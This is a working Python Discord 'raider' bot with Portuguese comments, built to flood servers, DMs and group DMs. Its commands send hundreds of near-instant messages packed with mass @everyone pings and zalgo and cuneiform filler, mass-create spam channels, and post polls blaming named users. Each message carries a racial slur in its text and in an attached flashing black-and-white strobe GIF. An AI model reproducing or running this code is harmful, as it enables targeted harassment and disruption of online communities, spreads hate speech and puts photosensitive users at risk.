#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAIDER v3 — SEM COOLDOWN, USER-INSTALL EDITION
- 6 comandos: /blame, /raid, /spam (customizavel), /ping, /whitelist, /blacklist
- Funciona em servers, DM direta e GROUP DMs (user install: allowed_installs)
- @everyone/@here REAL (allowed_mentions global + send explícito)
- Payload ~2000 chars com URLs dos GIFs custom (renderizam preview no client)
- Polls nativas (discord.Poll)
- Whitelist/blacklist em JSON (wl.json / bl.json)
- Spam SEM cooldown artificial: sleep minimo 0.008s, 429 respeita retry_after da lib
"""

import asyncio
import datetime
import io
import json
import math
import os
import random
import struct
import sys
import time
import zlib

import discord
from discord.ext import commands
from discord import app_commands

# ============================ CONFIG ============================
PREFIX = "!"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WHITELIST_FILE = os.path.join(BASE_DIR, "wl.json")
BLACKLIST_FILE = os.path.join(BASE_DIR, "bl.json")


def _load_token() -> str:
    env = os.getenv("DISCORD_TOKEN", "").strip()
    if env:
        return env
    try:
        with open(os.path.join(BASE_DIR, "token.txt"), "r", encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return ""


TOKEN = _load_token()
MAX_MSG = 2000

# ============================ BOT ============================
intents = discord.Intents.all()
intents.message_content = True
intents.presences = False

# allowed_mentions GLOBAL: sem isso o Discord corta @everyone/@here por padrão
bot = commands.Bot(
    command_prefix=PREFIX, intents=intents, help_command=None,
    allowed_mentions=discord.AllowedMentions(
        everyone=True, users=True, roles=True),
)

# USER-INSTALL: habilita comandos em DMs e group DMs
install_any = app_commands.allowed_installs(guilds=True, users=True)
ctx_any = app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)

# ============================ WL/BL ============================
def _load_list(path: str) -> list:
    try:
        with open(path, "r", encoding="utf-8") as f:
            d = json.load(f)
            return d if isinstance(d, list) else []
    except Exception:
        return []


def _save_list(path: str, lst: list) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(lst, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


OWNER_IDS = [1533178254318637186, 1515836421393481738]


def _owner_ok(uid: int) -> bool:
    return uid in OWNER_IDS or uid in _load_list(WHITELIST_FILE)


def _blocked(uid: int) -> bool:
    return uid in _load_list(BLACKLIST_FILE)


# ============================ PAYLOAD ============================
ZALGO_TOP = "".join(chr(c) for c in range(0x0300, 0x036F))
ZALGO_BOT = ("\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F"
             "\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327\u0328\u0329"
             "\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331\u0332\u0333\u0334\u0335")
ZALGO_MID = "\u0335\u0336\u0337\u0338"
WEIRD = [
    "\U0001242B", "\u202E", "\u200B", "\u200D", "\uFE0F", "\uFE0E",
    "\u180E", "\u3164", "\uFFA0", "\u061C", "\u2066\u2069", "\uFFFD",
    "\u0000\uFFF9\uFFFA\uFFFB", "\uE0000\uE007F", "\u10FFFF",
    "\uD7FF\uE000", "\u1F600", "\u2591\u2592\u2593\u2588",
    "\u2620\u2623\u2639\u2764", "\u26A0\u26A1\u2694\u269B",
]

# GIFs custom (acessos diretos — renderizam preview quando o bot envia a URL)
GIF_CUSTOM_URLS = [
    "https://cdn.discordapp.com/attachments/1533509443096940724/1533509532427358339/"
    "3dd02fa49042724212d60154cf81e1af5858f0f24caa7969a1ceba6174e8994b.1.gif",
    "https://cdn.discordapp.com/attachments/751825126189957160/751828025728958464/1.gif",
]
SOCIETY_LINE = "set society was here nigger"


def zalgo_text(n: int = 8) -> str:
    base = random.choice(["A", "S", "E", "T", "N", "H", "O", "X", "M"])
    out = base
    for _ in range(n):
        out += random.choice(ZALGO_TOP) + random.choice(ZALGO_BOT)
        if random.random() < 0.4:
            out += random.choice(ZALGO_MID)
    return out


def cunei_text(n_blocos: int = 12, min_rep: int = 8, max_rep: int = 22) -> str:
    return " ".join("\U0001242B" * random.randint(min_rep, max_rep)
                    for _ in range(n_blocos))


def build_nuke_payload() -> str:
    """~2000 chars estruturados:
       1) linha SOCIETY em caps/bold (bem visivel)
       2) @everyone/@here em massa
       3) cuneiforme+zalgo pra encher
       4) URL do GIF custom SEMPRE no final (preview visivel)"""
    # 1) texto visivel
    header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥"
    # 2) pings
    pings = " ".join(random.choice(["@everyone", "@here", "@everyone @everyone",
                                    "@here @here", "@everyone @here"])
                     for _ in range(random.randint(4, 7)))
    # 3) filler cuneiforme/zalgo (o que sobra de espaco)
    filler = []
    cur = 0
    budget = MAX_MSG - len(header) - len(pings) - 270  # reserva URL
    while cur < budget:
        r = random.random()
        if r < 0.55:
            seg = cunei_text(random.randint(5, 12))
        elif r < 0.75:
            seg = "\u202E" + zalgo_text(random.randint(5, 12)) + "\u202C"
        elif r < 0.9:
            seg = f"**{SOCIETY_LINE}** " + cunei_text(3)
        else:
            seg = "".join(random.choice(WEIRD) * random.randint(1, 4)
                          for _ in range(random.randint(3, 8)))
        if cur + len(seg) > budget:
            seg = seg[: budget - cur]
        filler.append(seg)
        cur += len(seg)
    body = f"{header}\n{pings}\n{''.join(filler)}\n{GIF_CUSTOM_URLS[0]}"
    return body[:MAX_MSG]


# ============================ MÍDIA ============================
_FONT_CANDIDATES = [
    "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSans-Bold.ttf",
    "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
    "/usr/share/fonts/TTF/DejaVuSans-Bold.ttf",
    "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSansCondensed-Bold.ttf",
    "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
]


def _load_font(size: int):
    from PIL import ImageFont
    for p in _FONT_CANDIDATES:
        try:
            return ImageFont.truetype(p, size)
        except Exception:
            continue
    try:
        return ImageFont.load_default()
    except Exception:
        return None


def make_strobe_gif(w: int = 640, h: int = 360, frames: int = 12) -> bytes:
    """GIF strobe: fundo alterna preto↔branco a cada frame (30ms),
    texto 'SET SOCIETY WAS HERE NIGGER' GIGANTE em 2 linhas com cor INVERTIDA
    por frame (branco no preto / preto no branco). Anexo real, não URL."""
    try:
        from PIL import Image, ImageDraw
    except Exception:
        # fallback: PNG estático gerado à mão (sem texto, só xadrez) — nunca chega a isso no Actions
        rows = []
        for y in range(h):
            row = bytearray([0])
            for x in range(w):
                band = (x // 32) % 2
                row += b"\x00\x00\x00" if (y // 32) % 2 == band else b"\xff\xff\xff"
            rows.append(bytes(row))
        raw = b"".join(rows)
        idat = zlib.compress(raw, 9)

        def chunk(tag, data):
            return struct.pack(">I", len(data)) + tag + data + \
                   struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) +
                chunk(b"IDAT", idat) + chunk(b"IEND", b""))
    imgs = []
    lines = ["SET SOCIETY", "WAS HERE NIGGER"]
    fnt = _load_font(96)
    for i in range(frames):
        bg = (0, 0, 0) if i % 2 == 0 else (255, 255, 255)
        fg = (255, 255, 255) if i % 2 == 0 else (0, 0, 0)
        img = Image.new("RGB", (w, h), bg)
        d = ImageDraw.Draw(img)
        # faixas verticais pra dar movimento visual extra
        for bx in range(0, w, 64):
            d.rectangle([bx, 0, bx + 32, h], fill=fg if i % 2 == 0 else bg)
        if fnt:
            for li, line in enumerate(lines):
                bb = d.textbbox((0, 0), line, font=fnt)
                tw, th = bb[2] - bb[0], bb[3] - bb[1]
                x = (w - tw) // 2 - bb[0]
                y = (h - th) // 2 + (li - 1) * (th + 8)
                d.text((x, y), line, fill=fg, font=fnt)
        imgs.append(img)
    buf = io.BytesIO()
    imgs[0].save(buf, format="GIF", save_all=True, append_images=imgs[1:],
                 duration=30, loop=0, optimize=False)
    return buf.getvalue()


STROBE_GIF = make_strobe_gif()


def _gif_file() -> discord.File:
    return discord.File(io.BytesIO(STROBE_GIF), filename="set-society.gif")




# ============================ POLL ============================
def _build_poll(question: str, options: list) -> discord.Poll:
    p = discord.Poll(question=question[:300],
                     duration=datetime.timedelta(days=7), multiple=True)
    for o in options:
        p.add_answer(text=str(o)[:55])
    return p


# ============================ EVENTOS ============================
@bot.event
async def on_ready():
    print(f"[+] Logado como {bot.user} (ID: {bot.user.id})", flush=True)
    print(f"[+] Prefixo: {PREFIX} | Slash: / | Guilds: {len(bot.guilds)}", flush=True)
    print(f"[+] WL: {_load_list(WHITELIST_FILE)} | BL: {_load_list(BLACKLIST_FILE)}", flush=True)
    try:
        synced = await bot.tree.sync()
        print(f"[+] Slash sincronizados: {len(synced)}", flush=True)
    except Exception as e:
        print(f"[!] Sync falhou: {e}", flush=True)
    if _rpc_active:
        try:
            await _apply_rpc(_rpc_active)
        except Exception as e:
            print(f"[!] RPC reapply falhou: {e}", flush=True)
    for g in bot.guilds:
        try:
            owner = g.owner
            if owner is None:
                owner = await g.fetch_member(g.owner_id)
            await owner.send(cunei_text(3) + "\n**Set Society** — raider v3 no ar.\n"
                             "Uso: `/spam 20`, `/spam 100 texto`, `/raid 10 5`, "
                             "`/ping`, `/whitelist add ID`")
            print(f"[+] DM pro dono de {g.name}", flush=True)
        except Exception:
            pass


@bot.event
async def on_message(msg):
    if msg.author.bot:
        return
    if _blocked(msg.author.id):
        return
    await bot.process_commands(msg)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    try:
        await ctx.send(f"```{error}```", delete_after=3)
    except Exception:
        pass


# ============================ RPC CUSTOM ============================
# Rich Presence "de app legítimo": nome custom + fotos (assets da sua app) + botões.
# Botões de RPC são LINKS (label + url), máx 2.
# Cria uma app em discord.com/developers/applications, sobe as imagens em
# Rich Presence > Art Assets e usa as KEYS aqui. RPC_APP_ID via env secreto.
RPC_APP_ID = os.getenv("RPC_APP_ID", "")
RPC_DEFAULT_LARGE = os.getenv("RPC_LARGE", "set_society_logo")
RPC_DEFAULT_SMALL = os.getenv("RPC_SMALL", "")
RPC_BTN = {"1": ("", ""), "2": ("", "")}  # label, url
_rpc_active = None  # dict do state atual pra reaplicar em reconexão


def _rpc_ws():
    try:
        return bot._connection.ws
    except Exception:
        return None


async def _apply_rpc(act):
    """Envia opcode 3 (presence update) pelo gateway com a activity montada."""
    global _rpc_active
    ws = _rpc_ws()
    if ws is None:
        return False
    if act is None:
        await ws.send_as_json({"op": 3, "d": {"since": 0, "activities": [],
                                              "status": "online", "afk": False}})
        _rpc_active = None
        return True
    buttons = []
    for i in ("1", "2"):
        label, url = RPC_BTN[i]
        if label and url:
            buttons.append(label)
    payload = {
        "op": 3,
        "d": {
            "since": 0,
            "activities": [{
                "name": act.get("name", "musica"),
                "type": act.get("type", 2),
                "state": act.get("state", ""),
                "details": act.get("details", ""),
                "timestamps": {"start": int(time.time() * 1000)},
                "party": {"id": "society", "size": [1, 99]},
            }],
            "status": act.get("status", "online"),
            "afk": False,
        },
    }
    if buttons:
        payload["d"]["activities"][0]["buttons"] = buttons
    if RPC_APP_ID:
        payload["d"]["activities"][0]["application_id"] = RPC_APP_ID
        assets = {}
        if RPC_DEFAULT_LARGE:
            assets["large_image"] = f"app_asset:{RPC_DEFAULT_LARGE}"
        if RPC_DEFAULT_SMALL:
            assets["small_image"] = f"app_asset:{RPC_DEFAULT_SMALL}"
        if assets:
            payload["d"]["activities"][0]["assets"] = assets
    await ws.send_as_json(payload)
    _rpc_active = act
    return True


@bot.hybrid_command(name="rpc", description="Rich presence custom (música/jogo). /rpc musica [nome] | jogo <nome> | off")
@install_any
@ctx_any
async def rpc(ctx, modo: str = "musica", nome: str = ""):
    if not await _check_ok(ctx):
        return
    m = modo.lower()
    if m == "off":
        await _apply_rpc(None)
        await ctx.send("🎮 RPC desligado", ephemeral=True)
        return
    if m in ("musica", "music", "listening"):
        act = {"name": nome or "luna fm", "type": 2, "status": "online"}
        if not RPC_BTN["1"][0]:
            RPC_BTN["1"] = ("🔗 Acessar", "https://discord.gg/")
        if not RPC_BTN["2"][0]:
            RPC_BTN["2"] = ("Curtir ♥", "https://open.spotify.com/")
    elif m in ("jogo", "game", "playing"):
        act = {"name": nome or "set society", "type": 0, "status": "online"}
        if not RPC_BTN["1"][0]:
            RPC_BTN["1"] = ("Jogar", "https://discord.gg/")
        if not RPC_BTN["2"][0]:
            RPC_BTN["2"] = ("Ver trailer", "https://www.youtube.com/")
    else:
        await ctx.send("✖ modos: musica | jogo | off", ephemeral=True)
        return
    ok = await _apply_rpc(act)
    await ctx.send(f"✅ RPC {'ativo' if ok else 'falhou'} — `{act['name']}` (type {act['type']})", ephemeral=True)


@bot.hybrid_command(name="rpcbtn", description="Configura botões do RPC (label + url). /rpcbtn 1 <label> <url>")
@install_any
@ctx_any
async def rpcbtn(ctx, numero: int = 1, label: str = "", url: str = ""):
    if not await _check_ok(ctx):
        return
    if numero not in (1, 2):
        await ctx.send("✖ botão 1 ou 2", ephemeral=True)
        return
    if not label or not url:
        await ctx.send("✖ /rpcbtn 1 <label> <url> — ex: /rpcbtn 1 Entrar https://discord.gg/xxx", ephemeral=True)
        return
    RPC_BTN[str(numero)] = (label[:32], url[:256])
    if _rpc_active:
        await _apply_rpc(_rpc_active)
    await ctx.send(f"✅ botão {numero}: `{label}` → {url}", ephemeral=True)


# ============================ HELPERS ============================
MENTIONS = discord.AllowedMentions(everyone=True, users=True, roles=True)


async def _check_ok(ctx) -> bool:
    """Owner/whitelist + canal válido. Silencioso em DM/group, avisa em guild."""
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return False
    return True


# ============================ COMANDOS ============================
@bot.hybrid_command(name="ping", description="Latência e status")
@install_any
@ctx_any
async def ping(ctx):
    if not await _check_ok(ctx):
        return
    t0 = time.time()
    msg = await ctx.send("pong...")
    lat = round(bot.latency * 1000, 1)
    await msg.edit(content=f"🏓 Pong! `{lat}ms` | API `{round((time.time()-t0)*1000,1)}ms`")


@bot.hybrid_command(name="spam", description="Flood 2000 chars + GIF + @everyone. /spam [vezes] [texto]")
@install_any
@ctx_any
# ============================ ENVIO / VIEW ============================
async def _burst_send(channel, n: int, base: str | None) -> int:
    """MESMO envio da v3.1: payload original (com @everyone em TODAS + URL do GIF
    no fim), sleep 0.008. Proteção mínima: 429 com retry alarmante (>10s) para
    o loop (mention budget exaurido) — retry curto espera e continua.
    Cada msg também leva o GIF strobe anexado. Retorna quantas de fato passaram."""
    ok = 0
    for _ in range(n):
        try:
            if base:
                msg = f"{base}\n\n{SOCIETY_LINE}\n{GIF_CUSTOM_URLS[0]}"
            else:
                msg = build_nuke_payload()
            await channel.send(msg, allowed_mentions=MENTIONS, file=_gif_file())
            ok += 1
        except discord.HTTPException as e:
            if e.status == 429:
                ra = getattr(e, "retry_after", None) or 1.0
                if ra > 10.0:
                    break
                await asyncio.sleep(ra)
            else:
                print(f"[burst] HTTP {e.status}", flush=True)
                break
        except Exception:
            break
        await asyncio.sleep(0.008)
    return ok


class SpamView(discord.ui.View):
    """Botão SPAM +10: visible só na mensagem ephemeral de quem rodou o comando."""

    def __init__(self, target, base: str | None, total: int = 0, timeout: float = 300.0):
        super().__init__(timeout=timeout)
        self.target = target
        self.base = base
        self.total = total

    @discord.ui.button(label="SPAM +10", style=discord.ButtonStyle.danger, emoji="💥")
    async def spam10(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            n = await _burst_send(self.target, 10, self.base)
            self.total += n
        except Exception:
            n = 0
        try:
            await interaction.edit_original_response(
                content=f"💥 **{self.total} msgs** em {self.target.mention} — spam +10 no botão",
                view=self)
        except Exception:
            pass


async def spam(ctx, vezes: int = 20, texto: str = ""):
    if not await _check_ok(ctx):
        return
    try:
        await ctx.defer(ephemeral=True)  # interação some: nada mostra quem rodou
    except Exception:
        pass
    vezes = max(1, min(vezes, 1000))
    base = texto.strip() if texto.strip() else None
    target = ctx.channel
    n = await _burst_send(target, vezes, base)
    view = SpamView(target=target, base=base, total=n, timeout=300)
    try:
        await ctx.followup.send(
            f"💥 **{n} msgs** em {target.mention} — spam +10 no botão 👇",
            ephemeral=True, view=view)
    except Exception:
        try:
            await ctx.send(f"✔ {n} msg", delete_after=5)
        except Exception:
            pass


@bot.hybrid_command(name="blame", description="Poll culpando alguém + spam. /blame @pessoa")
@install_any
@ctx_any
async def blame(ctx, pessoa: discord.User):
    if not await _check_ok(ctx):
        return
    try:
        await ctx.send(
            f"🔥 **{pessoa.mention}** foi quem destruiu o server 🔥",
            poll=_build_poll(f"QUEM É O CULPADO? ({pessoa})",
                             ["Set Society", SOCIETY_LINE, "o adm", "ninguém"]),
            allowed_mentions=MENTIONS)
        await ctx.send(build_nuke_payload(), allowed_mentions=MENTIONS)
    except Exception as e:
        await ctx.send(f"✖ {e}", delete_after=5)


@bot.hybrid_command(name="raid", description="Cria N canais com spam + GIF + poll. /raid [canais] [msgs]")
@install_any
@ctx_any
async def raid(ctx, canais: int = 10, msgs: int = 5):
    if not await _check_ok(ctx):
        return
    try:
        await ctx.defer(ephemeral=True)
    except Exception:
        pass
    if ctx.guild is None:
        await ctx.followup.send("✖ /raid só em servidor. Em grupo/DM usa /spam", ephemeral=True)
        return
    if not ctx.guild.me.guild_permissions.manage_channels:
        await ctx.followup.send("✖ Sem permissão de gerenciar canais", ephemeral=True)
        return
    canais = max(1, min(canais, 128))
    msgs = max(1, min(msgs, 10))
    created = []
    for i in range(canais):
        try:
            ch = await ctx.guild.create_text_channel(
                random.choice(["𒐫𒐫𒐫", "𒐫-nuked", "set-society",
                               "𒐫-jax", "𒐫-gg"]) + f"-{i}")
            created.append(ch)
        except Exception:
            pass
        await asyncio.sleep(0.03)
    for ch in created:
        await _burst_send(ch, msgs, None)
        try:
            await ch.send("QUEM VAI CAIR?", poll=_build_poll(
                "Set Society raid — quem é o próximo?",
                ["o adm", "todos", "ninguém", SOCIETY_LINE]))
        except Exception:
            pass
    try:
        await ctx.followup.send(
            f"💥 **Raid**: {len(created)} canais × {msgs} msg + polls",
            ephemeral=True)
    except Exception:
        pass


@bot.hybrid_command(name="whitelist", description="Adiciona alguém à whitelist. /whitelist @pessoa")
@install_any
@ctx_any
async def whitelist(ctx, pessoa: discord.User):
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return
    if _blocked(pessoa.id):
        await ctx.send(f"✖ {pessoa.mention} está na blacklist — tira da BL primeiro", delete_after=5)
        return
    lst = _load_list(WHITELIST_FILE)
    if pessoa.id in lst:
        await ctx.send(f"ℹ {pessoa.mention} já está na whitelist", delete_after=5)
        return
    lst.append(pessoa.id)
    _save_list(WHITELIST_FILE, lst)
    await ctx.send(f"✔ {pessoa.mention} adicionado à whitelist ({pessoa.id})", delete_after=5)


@bot.hybrid_command(name="blacklist", description="Bloqueia alguém e tira da whitelist. /blacklist @pessoa")
@install_any
@ctx_any
async def blacklist(ctx, pessoa: discord.User):
    if not _owner_ok(ctx.author.id):
        await ctx.send("✖ Sem permissão", delete_after=3)
        return
    # remove da whitelist
    wl = _load_list(WHITELIST_FILE)
    if pessoa.id in wl:
        wl.remove(pessoa.id)
        _save_list(WHITELIST_FILE, wl)
    # toggle na blacklist: já está -> desbloqueia; não está -> bloqueia
    bl = _load_list(BLACKLIST_FILE)
    if pessoa.id in bl:
        bl.remove(pessoa.id)
        _save_list(BLACKLIST_FILE, bl)
        await ctx.send(f"✔ {pessoa.mention} desbloqueado (removido da blacklist)", delete_after=5)
        return
    bl.append(pessoa.id)
    _save_list(BLACKLIST_FILE, bl)
    await ctx.send(f"✔ {pessoa.mention} bloqueado + removido da whitelist", delete_after=5)


# ============================ MAIN ============================
if __name__ == "__main__":
    bot.run(TOKEN)